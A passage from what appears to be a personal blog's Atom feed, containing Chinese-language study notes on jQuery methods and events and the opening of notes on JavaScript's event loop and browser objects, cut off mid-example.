class="line">$(&quot;ul li&quot;).eq(2).mouseover()</span><br></pre></td></tr></table></figure><h3 id="链式编程"><a href="#链式编程" class="headerlink" title="链式编程"></a>链式编程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(this).css(&#x27;color&#x27;,&#x27;red&#x27;).siblings().css(&#x27;color&#x27;,&#x27;&#x27;)</span><br></pre></td></tr></table></figure><h3 id="操作CSS方法"><a href="#操作CSS方法" class="headerlink" title="操作CSS方法"></a>操作CSS方法</h3><ol><li><p>参数只写属性名，则是返回属性值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(this).css(&#x27;color&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>参数是属性名，属性值，逗号分隔，设置样式，属性名必须加引号，值是数字可以不跟单位和引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(this).css(&#x27;color&#x27;,&#x27;blue&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>参数可以是对象形式，属性名属性值用冒号隔开，属性可以不加引号,复合属性需要驼峰命名法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(this).css(&#123;&quot;color&quot;:&quot;white&quot;,&quot;font-size&quot;:&quot;20px&quot;&#125;)</span><br><span class="line">backgroundColor:&quot;red&quot;</span><br></pre></td></tr></table></figure></li></ol><h3 id="设置类样式方法"><a href="#设置类样式方法" class="headerlink" title="设置类样式方法"></a>设置类样式方法</h3><p>作用相当于之前的classList，可以操作类样式，操作类里面的参数不要加点</p><ol><li><p>添加类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;div&quot;).addClass(&quot;current&quot;)</span><br></pre></td></tr></table></figure></li><li><p>删除类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;div&quot;).removeClass(&quot;current&quot;)</span><br></pre></td></tr></table></figure></li><li><p>切换类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;div&quot;).toggleClass(&quot;current&quot;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="类操作和className区别"><a href="#类操作和className区别" class="headerlink" title="类操作和className区别"></a>类操作和className区别</h3><p>原生JS中的className会覆盖元素原先里面的类名</p><p>jQuery里面类操作只是对指定类进行操作，不影响原先的类名</p><h3 id="jQuery效果"><a href="#jQuery效果" class="headerlink" title="jQuery效果"></a>jQuery效果</h3><p>jQuery封装了很多动画效果</p><p><img src="https://i.loli.net/2021/12/03/KlqUIWMuk7FjBfS.png" alt="image-20211203170815980"></p><ol><li><p>显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show([speed,[easing],[fn]])</span><br><span class="line"></span><br><span class="line">speed:&quot;slow&quot; &quot;normal&quot; &quot;fast&quot;</span><br><span class="line">easing: &quot;swing&quot; &quot;linear&quot;</span><br><span class="line">fn:回调函数</span><br></pre></td></tr></table></figure></li><li><p>隐藏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hide([speed,[easing],[fn]])</span><br><span class="line"></span><br><span class="line">speed:&quot;slow&quot; &quot;normal&quot; &quot;fast&quot;</span><br><span class="line">easing: &quot;swing&quot; &quot;linear&quot;</span><br><span class="line">fn:回调函数</span><br></pre></td></tr></table></figure></li><li><p>滑动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slideDown([speed,[easing],[fn]])</span><br><span class="line"></span><br><span class="line">speed:&quot;slow&quot; &quot;normal&quot; &quot;fast&quot;</span><br><span class="line">easing: &quot;swing&quot; &quot;linear&quot;</span><br><span class="line">fn:回调函数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slideUp([speed,[easing],[fn]])</span><br><span class="line"></span><br><span class="line">speed:&quot;slow&quot; &quot;normal&quot; &quot;fast&quot;</span><br><span class="line">easing: &quot;swing&quot; &quot;linear&quot;</span><br><span class="line">fn:回调函数</span><br></pre></td></tr></table></figure></li><li><p>事件切换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hover([over,]out)</span><br><span class="line">over:鼠标移动上去出发，相当于mouseover</span><br><span class="line">out:鼠标移出元素要触发的函数，相当于mouseleave</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;td&quot;).hover(</span><br><span class="line">  function () &#123;</span><br><span class="line">    $(this).addClass(&quot;hover&quot;);</span><br><span class="line">  &#125;,</span><br><span class="line">  function () &#123;</span><br><span class="line">    $(this).removeClass(&quot;hover&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>动画队列(效果队列)</p><p>动画或效果一旦被触发就会执行，如果多次触发或者效果排队执行</p><p>停止排队</p><p>stop用于停止动画，stop要写到动画或者效果的前面，相当于停止结束上一次动画</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop().slideToggle()</span><br></pre></td></tr></table></figure></li><li><p>淡入淡出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fadeIn([speed,[easing],[fn]])</span><br><span class="line">fadeOut</span><br><span class="line">fadeToggle</span><br><span class="line">fadeTo(speed,opacity,[easing],[fn]])</span><br></pre></td></tr></table></figure></li><li><p>自定义动画animate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animate[params,[speed],[easing],[fn]]</span><br><span class="line">params:想要修改的样式，一对向行驶传递，必须写，属性名可以不用带引号，复合属性必须使用驼峰命名法borderLeft，其余参数可以省略</span><br></pre></td></tr></table></figure></li></ol><h3 id="jQuery属性"><a href="#jQuery属性" class="headerlink" title="jQuery属性"></a>jQuery属性</h3><ul><li>固有属性 a href  input type</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.prop(&quot;href&quot;,[&#x27;www.baidu.com&#x27;])</span><br></pre></td></tr></table></figure><ul><li>自定义属性</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.attr(&quot;index&quot;,1)</span><br></pre></td></tr></table></figure><h3 id="jQuery内容文本"><a href="#jQuery内容文本" class="headerlink" title="jQuery内容文本"></a>jQuery内容文本</h3><ol><li><p>普通元素HTML</p><p>相当于innerHTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).html()//获取元素内容</span><br><span class="line">$(&#x27;div&#x27;).html(&quot;内容&quot;)//设置元素内容</span><br></pre></td></tr></table></figure></li><li><p>普通元素文本内容text()</p><p>相当于innerText</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).text()//获取元素内容</span><br></pre></td></tr></table></figure></li><li><p>获取设置表单值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;input&#x27;).val(&#x27;123&#x27;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="jQuery选择祖父"><a href="#jQuery选择祖父" class="headerlink" title="jQuery选择祖父"></a>jQuery选择祖父</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;.one&#x27;).parents(&#x27;.four&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toFixed(2)//两位小数</span><br></pre></td></tr></table></figure><h3 id="jQuery元素操作"><a href="#jQuery元素操作" class="headerlink" title="jQuery元素操作"></a>jQuery元素操作</h3><p>遍历、创建、添加、删除</p><ol><li><p>遍历</p><p>jQuery隐式迭代是对同一类元素做了同样的操作，如果相对同一类元素做不同的操作需要进行遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).each(function(index,domEle)&#123;&#125;)</span><br><span class="line">index:每个元素索引号</span><br><span class="line">domEle是每个DOM元素对象，不是jquery对象</span><br><span class="line">要想使用jQuery方法，需要将这个dom元素转化为jQuery对象$(domEle)</span><br><span class="line"></span><br><span class="line">$.each(object,function(index,Ele)&#123;&#125;)</span><br><span class="line">用于遍历任何元素</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        arr=[<span class="string">&#x27;blue&#x27;</span>,<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            $(<span class="string">&#x27;div&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">i,div</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log(div);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log($(div));</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log($(div)[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                $(div).css(<span class="string">&#x27;color&#x27;</span>,arr[i]);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li><li><p>创建元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var li=$(&#x27;&lt;li&gt;&lt;li&gt;&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>添加元素</p><p>内部添加(父子)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;ul&#x27;).append(li)//追加</span><br><span class="line">$(&#x27;ul&#x27;).prepend(li)//在最前面添加</span><br></pre></td></tr></table></figure><p>外部添加(兄弟)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var div=$(&#x27;&lt;div&gt;&lt;div&gt;&#x27;)</span><br><span class="line">$(&#x27;.test&#x27;).after(div)//追加</span><br><span class="line">$(&#x27;.test&#x27;).before(div)//在最前面添加</span><br></pre></td></tr></table></figure></li><li><p>删除元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.remove()</span><br><span class="line">element.empty()</span><br><span class="line">element.html(&quot;&quot;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="jQuery尺寸操作"><a href="#jQuery尺寸操作" class="headerlink" title="jQuery尺寸操作"></a>jQuery尺寸操作</h3><p><img src="https://s2.loli.net/2021/12/04/eU2YF8W4IHgEp7Q.png" alt="image-20211204103807620"></p><ul><li>以上参数为空，则是获取响应值，返回数字型</li><li>如果参数为数字则是修改相应值</li></ul><ol><li><p>offset()设置获取元素偏移</p><p>被选元素相对于文档的便宜坐标，跟父级没有关系</p></li><li><p>position()获取元素偏移</p><p>被选元素相对于<strong>带有定位的父级偏移坐标</strong>，父级没有定位，则以文档为主</p></li><li><p>scrollTop()，scrollLeft()设置获取元素被卷去的头部</p><p><img src="https://s2.loli.net/2021/12/04/rTcuiB8n3Qs6XVa.png" alt="image-20211204110421266"></p></li></ol><h2 id="jQuery事件"><a href="#jQuery事件" class="headerlink" title="jQuery事件"></a>jQuery事件</h2><h3 id="JQuery事件注册"><a href="#JQuery事件注册" class="headerlink" title="JQuery事件注册"></a>JQuery事件注册</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element.事件(function()&#123;&#125;)</span><br><span class="line">$(&#x27;div&#x27;).click(function()&#123;&#125;)</span><br></pre></td></tr></table></figure><p>其他时间基本跟原生js一致</p><p>例如：mouseover、mouseout、blur、focus、change、keydown、keyup、resize、scroll</p><h3 id="事件处理on-绑定事件"><a href="#事件处理on-绑定事件" class="headerlink" title="事件处理on()绑定事件"></a>事件处理on()绑定事件</h3><p>on()方法在匹配的元素上绑定一个或者多个事件的事件处理函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.on(events,[selector],fn)</span><br></pre></td></tr></table></figure><p>on优势</p><ul><li><p>可以绑定多个事件，多个事件处理程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).on(&#123;</span><br><span class="line">&quot;mouseover&quot;:function()&#123;&#125;,</span><br><span class="line">&quot;mouseout&quot;:function()&#123;&#125;,</span><br><span class="line">&quot;click&quot;:function()&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>如果事件处理程序相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).on(&quot;mouseover mouseout&quot;,function()&#123;</span><br><span class="line">$(this).toggleClass(&quot;current&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>可以实现事件的委派操作</p><p>把原来加给子元素的事件绑定在父元素上，就是把事件委派给父元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(selector).on(event,childSelector,data,function)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;我们都是好孩子&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;我们都是好孩子&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;我们都是好孩子&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;我们都是好孩子&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;我们都是好孩子&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function()&#123;</span><br><span class="line">            $(&#x27;ul&#x27;).on(&#x27;click&#x27;,&#x27;li&#x27;,function()&#123;</span><br><span class="line">                alert(&quot;好孩子&quot;);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li><li><p>可以实现动态创建的元素进行绑定，动态创建的元素只能通过on绑定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(function()&#123;</span><br><span class="line">    $(&#x27;ul&#x27;).on(&#x27;click&#x27;,&#x27;li&#x27;,function()&#123;</span><br><span class="line">        alert(&quot;好孩子&quot;);</span><br><span class="line">    &#125;)</span><br><span class="line">    $(&#x27;ol&#x27;).on(&#x27;click&#x27;,&#x27;li&#x27;,function()&#123;</span><br><span class="line">        alert(&#x27;好孩子&#x27;);</span><br><span class="line">    &#125;)</span><br><span class="line">    var li=$(&#x27;&lt;li&gt;好孩子&lt;/li&gt;&#x27;);</span><br><span class="line">    $(&#x27;ol&#x27;).append(li);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>微博发布案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(function()&#123;</span><br><span class="line">        $(&#x27;.btn&#x27;).on(&#x27;click&#x27;,function()&#123;</span><br><span class="line">            var li=$(&#x27;&lt;li&gt;&lt;/li&gt;&#x27;);</span><br><span class="line">            li.html($(&#x27;.txt&#x27;).val()+&quot;&lt;a href=&#x27;javascript:;&#x27;&gt; 删除&lt;/a&gt;&quot;)</span><br><span class="line">            $(&#x27;ul&#x27;).prepend(li);</span><br><span class="line">            li.show(2000);</span><br><span class="line">            $(&#x27;.txt&#x27;).val(&quot;&quot;);</span><br><span class="line">        &#125;)</span><br><span class="line">        $(&quot;ul&quot;).on(&quot;click&quot;,&quot;a&quot;,function()&#123;</span><br><span class="line">            $(this).parent().slideUp(function()&#123;</span><br><span class="line">                $(this).remove();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)    </span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="事件处理off-解绑事件"><a href="#事件处理off-解绑事件" class="headerlink" title="事件处理off()解绑事件"></a>事件处理off()解绑事件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).off([事件]);</span><br></pre></td></tr></table></figure><h3 id="事件触发one-触发一次"><a href="#事件触发one-触发一次" class="headerlink" title="事件触发one()触发一次"></a>事件触发one()触发一次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(function()&#123;</span><br><span class="line">        $(&#x27;.btn&#x27;).one(&#x27;click&#x27;,function()&#123;</span><br><span class="line">            var li=$(&#x27;&lt;li&gt;&lt;/li&gt;&#x27;);</span><br><span class="line">            li.html($(&#x27;.txt&#x27;).val()+&quot;&lt;a href=&#x27;javascript:;&#x27;&gt; 删除&lt;/a&gt;&quot;)</span><br><span class="line">            $(&#x27;ul&#x27;).prepend(li);</span><br><span class="line">            li.show(2000);</span><br><span class="line">            $(&#x27;.txt&#x27;).val(&quot;&quot;);</span><br><span class="line">        &#125;)</span><br><span class="line">        $(&quot;ul&quot;).one(&quot;click&quot;,&quot;a&quot;,function()&#123;</span><br><span class="line">            $(this).parent().slideUp(function()&#123;</span><br><span class="line">                $(this).remove();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)    </span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="自动触发事件trigger"><a href="#自动触发事件trigger" class="headerlink" title="自动触发事件trigger()"></a>自动触发事件trigger()</h3><p>有些事件希望自动触发，可以利用定时器自动触发右侧按钮点击事件，不必鼠标点击触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element.trigger()</span><br><span class="line">element.triggerHandler()//不会触发元素的默认行为</span><br></pre></td></tr></table></figure><h3 id="jQuery事件对象"><a href="#jQuery事件对象" class="headerlink" title="jQuery事件对象"></a>jQuery事件对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(div).on(&#x27;click&#x27;,function(event)&#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>阻止默认行为:event.preventDefault()或者return false</p><p>阻止冒泡:event.stopPropagation()</p><h2 id="jQuery其他方法"><a href="#jQuery其他方法" class="headerlink" title="jQuery其他方法"></a>jQuery其他方法</h2><h3 id="jQuery拷贝对象"><a href="#jQuery拷贝对象" class="headerlink" title="jQuery拷贝对象"></a>jQuery拷贝对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.extend([deep],target,object1,[objectN])</span><br></pre></td></tr></table></figure><h3 id="jQuery多库共存"><a href="#jQuery多库共存" class="headerlink" title="jQuery多库共存"></a>jQuery多库共存</h3><p>jQuery使用$作为标识符，随着jQuery流行，其他js库也是用$作为标识符，这样会产生冲突</p></li></ul><p>​        解决方法：1.使用jQuery替代$</p><p>​                            2.规定新的变量名var suibian=$.noConflict();</p><p>​                                                            subian(“span”)</p><h2 id="jQuery插件"><a href="#jQuery插件" class="headerlink" title="jQuery插件"></a>jQuery插件</h2><p>jQuery之家</p><p>EasyLazyLoad</p><p>fullPageal</p><h2 id="todolist"><a href="#todolist" class="headerlink" title="todolist"></a>todolist</h2><h3 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h3><h4 id="只能保存字符串"><a href="#只能保存字符串" class="headerlink" title="只能保存字符串"></a>只能保存字符串</h4><p>JSON.stringify() + JSON.parse()</p><h4 id="本地存储取数据"><a href="#本地存储取数据" class="headerlink" title="本地存储取数据"></a>本地存储取数据</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jQuery&quot;&gt;&lt;a href=&quot;#jQuery&quot; class=&quot;headerlink&quot; title=&quot;jQuery&quot;&gt;&lt;/a&gt;jQuery&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>javascript</title>
    <link href="https://zengxiang21.github.io/2021/12/03/javascript/"/>
    <id>https://zengxiang21.github.io/2021/12/03/javascript/</id>
    <published>2021-12-03T02:26:32.299Z</published>
    <updated>2021-12-12T02:28:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h1><h2 id="javascript执行顺序"><a href="#javascript执行顺序" class="headerlink" title="javascript执行顺序"></a>javascript执行顺序</h2><h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><h4 id="同步任务"><a href="#同步任务" class="headerlink" title="同步任务"></a>同步任务</h4><p>同步任务都在主线程上执行，形成一个执行栈</p><h4 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h4><p>javascript的异步是通过回调函数实现的</p><p>一般而言异步任务有三种类型：</p><ol><li>普通事件，click，resize</li><li>资源加载，load，error</li><li>定时器，setInterval，setTimeout</li></ol><h3 id="执行机制"><a href="#执行机制" class="headerlink" title="执行机制"></a>执行机制</h3><ol><li>先执行执行栈中的同步任务</li><li>异步任务(回调函数)放入任务队列</li><li>一旦执行栈中的所有同步任务执行完毕，系统就会按次序读取任务队列中的异步任务，于是被读取的异步任务结束等待状态，进入执行栈，开始执行。</li></ol><p><img src="https://i.loli.net/2021/11/22/mjqvl8zLbsJxBaw.png" alt="image-20211122110618997"></p><p><img src="https://i.loli.net/2021/11/22/gHMriDfIl96x5Re.png" alt="img"></p><p>执行顺序如下：</p><ul><li>同步任务：进入主线程后，立即执行。</li><li>异步任务：会先进入 Event Table；等时间到了之后，再进入 Event Queue，然后排队（为什么要排队？因为同一时间，JS 只能执行一个任务）。比如说，<code>setTimeout(()=&gt; &#123;&#125;, 1000)</code>这种定时器任务，需要等一秒之后再进入 Event Queue。</li><li>当主线程的任务执行完毕之后，此时主线程处于空闲状态，于是会去读取 Event Queue 中的任务队列，如果有任务，则进入到主线程去执行。</li></ul><p><img src="https://i.loli.net/2021/11/22/5NLr2IvK6OzWSdT.png" alt="image-20211122111623612"></p><h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><h3 id="url"><a href="#url" class="headerlink" title="url"></a>url</h3><p><img src="https://i.loli.net/2021/11/22/qvz2HU4pLk1OafN.png" alt="image-20211122112504936"></p><p><img src="https://i.loli.net/2021/11/22/Zk4wIMhDmsiE9Ly.png" alt="image-20211122112535135"></p><h2 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h2><p>navigator对象包含浏览器信息，含有很多属性，最常用的是userAgent,返回客户端发给服务器的user-agent头部的值</p><p>useagent显示登录设备</p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p><img src="https://i.loli.net/2021/11/23/6Nn7wIhzWfTxKFm.png" alt="image-20211123163927802"></p><h2 id="网页特效"><a href="#网页特效" class="headerlink" title="网页特效"></a>网页特效</h2><h3 id="元素偏移量offset"><a href="#元素偏移量offset" class="headerlink" title="元素偏移量offset"></a>元素偏移量offset</h3><p>可以使用offset相关属性动态获取该元素的位置、大小等</p><ul><li>获取元素距离有定位父元素的位置</li><li>获得元素自身的大小</li><li>返回数值不带单位</li></ul><p><img src="https://i.loli.net/2021/11/23/BinIKzxOfMTXjra.png" alt="image-20211123164749989"></p><p><img src="https://i.loli.net/2021/11/23/lK1kJLG48q7Ar9Q.png" alt="image-20211123170838537"></p><p>style没法获取内嵌样式表里的属性大小，只能获取行内样式表里的大小</p><p>就是style标签里的不行。</p><p>获取用offset，修改用style</p><h3 id="案例：拖动div"><a href="#案例：拖动div" class="headerlink" title="案例：拖动div"></a>案例：拖动div</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 